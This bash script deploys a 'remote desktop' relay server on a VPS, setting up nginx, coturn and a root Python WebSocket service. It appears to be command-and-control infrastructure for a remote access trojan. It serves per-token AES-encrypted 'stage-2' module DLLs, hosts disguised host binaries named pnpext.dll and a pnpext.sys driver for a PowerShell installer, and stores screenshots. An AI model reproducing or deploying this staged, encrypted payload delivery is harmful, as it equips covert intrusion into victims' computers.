#!/usr/bin/env bash
# Remote Desktop VPS Deploy Script
# Usage: sudo bash deploy-vps.sh [TURN_USER] [TURN_PASS]
set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WEB_ROOT="/var/www/remote-desktop"
SERVICE_NAME="rdp-relay"
RELAY_DIR="/opt/remotedesk"
VENV="$RELAY_DIR/venv"
PYTHON_PORT=8080
TURN_USER="${1:-rdp}"
TURN_PASS="${2:-$(openssl rand -base64 12)}"
SERVER_IP=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
SSL_DIR="/etc/nginx/ssl-remote-desktop"

echo "==========================================="
echo "  Remote Desktop VPS Setup"
echo "  Server IP: $SERVER_IP"
echo "==========================================="

echo "[1/10] Installing packages..."
apt-get update -qq
apt-get install -y -qq nginx python3 python3-pip python3-venv openssl coturn >/dev/null 2>&1
echo "  done"

echo "[2/10] Python environment..."
mkdir -p "$RELAY_DIR"
if [ ! -x "$VENV/bin/python3" ]; then
    rm -rf "$VENV"
    python3 -m venv "$VENV"
    echo "  venv created"
else
    echo "  venv exists"
fi
"$VENV/bin/pip" install --quiet --upgrade pip
"$VENV/bin/pip" install --quiet websockets cryptography Pillow
echo "  done"

mkdir -p /opt/remotedesk/screenshots
echo "[3/11] Deploying relay server..."
SRC="$SCRIPT_DIR/server.py"
DST="$RELAY_DIR/server.py"
if [ -f "$SRC" ]; then
    SRC_REAL="$(realpath "$SRC" 2>/dev/null || echo "$SRC")"
    DST_REAL="$(realpath "$DST" 2>/dev/null || echo "$DST")"
    if [ "$SRC_REAL" != "$DST_REAL" ]; then
        cp "$SRC" "$DST"
    fi
fi
chmod +x "$DST"
echo "  done"

echo "[4/11] Deploying stage-2 module DLLs..."
# Layout: one shared set of DLLs for ALL room tokens.
#     /opt/remotedesk/stage2/<module>.dll          ← source of truth
#     /opt/remotedesk/stage2/cache/<token>/*.bin   ← auto-generated per-token
#
# server.py's stage2_fetch handler takes a (token, module) pair, derives
# the AES-256-GCM key from the token, encrypts the DLL on the fly on first
# access and caches the encrypted blob under cache/<token>/. Admin never
# has to pre-generate per-token blobs — adding or rotating tokens is a
# no-op on the VPS.
STAGE2_DIR="$RELAY_DIR/stage2"
mkdir -p "$STAGE2_DIR" "$STAGE2_DIR/cache"
chmod 755 "$STAGE2_DIR" "$STAGE2_DIR/cache"

SRC_STAGE2="$SCRIPT_DIR/stage2"
copied=0
if [ -d "$SRC_STAGE2" ]; then
    # Accept both flat layout (stage2/*.dll) and legacy per-token layout
    # (stage2/<token>/*.dll stripped to just DLLs). Only .dll files.
    for dll in "$SRC_STAGE2"/*.dll "$SRC_STAGE2"/**/*.dll; do
        [ -f "$dll" ] || continue
        base="$(basename "$dll")"
        cp "$dll" "$STAGE2_DIR/$base"
        echo "  $base -> $STAGE2_DIR/"
        copied=$((copied + 1))
    done
fi
chmod 644 "$STAGE2_DIR"/*.dll 2>/dev/null || true

# Any stale cached blobs should be invalidated when DLLs change, so wipe
# the cache on deploy. Cost is small — server re-generates on first access.
if [ -d "$STAGE2_DIR/cache" ]; then
    find "$STAGE2_DIR/cache" -type f -name '*.bin' -delete 2>/dev/null || true
fi

if [ $copied -eq 0 ]; then
    echo "  no stage2/*.dll found in $SCRIPT_DIR - skipping"
    echo "  (host falls back to stage-1 handlers, everything still works)"
else
    echo "  deployed $copied module DLL(s); per-token blobs will be auto-generated on first fetch"
fi

echo "[5/11] Deploying web client + host files..."
mkdir -p "$WEB_ROOT" "$WEB_ROOT/files"
# index.html → web root
SRC="$SCRIPT_DIR/index.html"
DST="$WEB_ROOT/index.html"
if [ -f "$SRC" ]; then
    SRC_REAL="$(realpath "$SRC" 2>/dev/null || echo "$SRC")"
    DST_REAL="$(realpath "$DST" 2>/dev/null || echo "$DST")"
    if [ "$SRC_REAL" != "$DST_REAL" ]; then
        cp "$SRC" "$DST"
    fi
    echo "  index.html deployed"
fi
# Host binaries → /files/ (for install-web.ps1 and remote host update)
for f in pnpext.dll pnpext.sys; do
    SRC="$SCRIPT_DIR/$f"
    if [ -f "$SRC" ]; then
        cp "$SRC" "$WEB_ROOT/files/$f"
        echo "  $f -> $WEB_ROOT/files/"
    fi
done
chown -R www-data:www-data "$WEB_ROOT"
echo "  done"

echo "[6/11] SSL certificate..."
mkdir -p "$SSL_DIR"
if [ ! -f "$SSL_DIR/cert.pem" ]; then
    openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
        -keyout "$SSL_DIR/key.pem" \
        -out "$SSL_DIR/cert.pem" \
        -subj "/CN=remote-desktop" >/dev/null 2>&1
    echo "  generated (10 years)"
else
    echo "  exists, skipping"
fi

echo "[7/11] Configuring nginx..."
if [ -f "$SCRIPT_DIR/nginx.conf" ]; then
    cp "$SCRIPT_DIR/nginx.conf" /etc/nginx/nginx.conf
fi
rm -f /etc/nginx/sites-enabled/default
if [ -f "$SCRIPT_DIR/nginx-remote-desktop.conf" ]; then
    cp "$SCRIPT_DIR/nginx-remote-desktop.conf" /etc/nginx/sites-available/remote-desktop
fi
ln -sf /etc/nginx/sites-available/remote-desktop /etc/nginx/sites-enabled/remote-desktop
nginx -t
systemctl reload nginx
echo "  done"

echo "[8/11] Creating relay service..."
cat > "/etc/systemd/system/${SERVICE_NAME}.service" << EOF
[Unit]
Description=Remote Desktop WebSocket Relay
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$RELAY_DIR
ExecStart=$VENV/bin/python3 $RELAY_DIR/server.py
Restart=always
RestartSec=3
Environment=PYTHONUNBUFFERED=1
StandardOutput=journal
StandardError=journal
SyslogIdentifier=rdp-relay

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl restart "$SERVICE_NAME"
echo "  done"

echo "[9/11] Configuring coturn..."
sed -i 's/^#TURNSERVER_ENABLED=1/TURNSERVER_ENABLED=1/' /etc/default/coturn 2>/dev/null || true
grep -q "TURNSERVER_ENABLED=1" /etc/default/coturn 2>/dev/null || echo "TURNSERVER_ENABLED=1" >> /etc/default/coturn
cat > /etc/turnserver.conf << EOF
listening-port=3478
listening-ip=0.0.0.0
external-ip=$SERVER_IP
min-port=49152
max-port=65535
lt-cred-mech
user=$TURN_USER:$TURN_PASS
realm=remote-desktop
log-file=/var/log/turnserver.log
simple-log
total-quota=0
max-bps=0
stale-nonce=600
no-throttle
no-rate-limit
no-multicast-peers
no-cli
fingerprint
EOF
systemctl enable coturn
systemctl restart coturn
echo "  done"

echo "[10/11] UDP buffer tuning..."
sysctl -w net.core.rmem_max=4194304 >/dev/null 2>&1
sysctl -w net.core.wmem_max=4194304 >/dev/null 2>&1
sysctl -w net.core.rmem_default=1048576 >/dev/null 2>&1
sysctl -w net.core.wmem_default=1048576 >/dev/null 2>&1
for p in "net.core.rmem_max=4194304" "net.core.wmem_max=4194304" "net.core.rmem_default=1048576" "net.core.wmem_default=1048576"; do
    k="${p%%=*}"
    grep -q "^$k" /etc/sysctl.conf 2>/dev/null && sed -i "s|^$k=.*|$p|" /etc/sysctl.conf || echo "$p" >> /etc/sysctl.conf
done
echo "  done"

echo "[11/11] Firewall..."
if command -v ufw >/dev/null 2>&1 && ufw status | grep -q "active"; then
    ufw allow 80/tcp >/dev/null 2>&1
    ufw allow 443/tcp >/dev/null 2>&1
    # Port 8080 is exposed for direct host_file connections (plain WS for max
    # file transfer throughput). Command/stream traffic stays on TLS:443.
    ufw allow $PYTHON_PORT/tcp >/dev/null 2>&1
    ufw allow 3478/udp >/dev/null 2>&1
    ufw allow 3478/tcp >/dev/null 2>&1
    ufw allow 49152:65535/udp >/dev/null 2>&1
    echo "  ports opened"
else
    echo "  ufw not active"
fi

echo ""
echo "==========================================="
echo "  Deploy complete!"
echo "==========================================="
echo ""
echo "  Web:   https://$SERVER_IP/"
echo "  Host:  wss://$SERVER_IP:443/host   (TLS via nginx)"
echo "  TURN:  turn:$TURN_USER:$TURN_PASS@$SERVER_IP:3478"
echo "  STUN:  stun:$SERVER_IP:3478"
echo ""
echo "  host_config.json:"
echo "    \"server\":   \"$SERVER_IP\","
echo "    \"port\":     443,"
echo "    \"use_tls\":  true,"
echo "    \"stun_server\": \"stun:$SERVER_IP:3478\","
echo "    \"turn_server\": \"turn:$TURN_USER:$TURN_PASS@$SERVER_IP:3478\""
echo ""
echo "  Update client:  cp index.html $WEB_ROOT/"
echo "  Update relay:   cp server.py $RELAY_DIR/ && systemctl restart $SERVICE_NAME"
echo ""
# Stage-2 status: shows which module DLLs are deployed + how many tokens cached.
if [ -d "$STAGE2_DIR" ]; then
    s2_dlls="$(find "$STAGE2_DIR" -maxdepth 1 -type f -name '*.dll' -printf "%f " 2>/dev/null)"
    s2_cached="$(find "$STAGE2_DIR/cache" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | wc -l)"
    if [ -n "$s2_dlls" ]; then
        echo "  Stage-2 modules on VPS: $s2_dlls"
        echo "    Shared by all tokens (server encrypts on the fly per token)."
        echo "    Cache: $s2_cached token(s) served so far, stored in $STAGE2_DIR/cache/"
        echo "    To update DLLs: rebuild locally + re-run this deploy script."
    else
        echo "  Stage-2: no module DLLs deployed"
        echo "    To deploy: put stage2/*.dll next to this script, re-run deploy-vps.sh"
    fi
    echo ""
fi
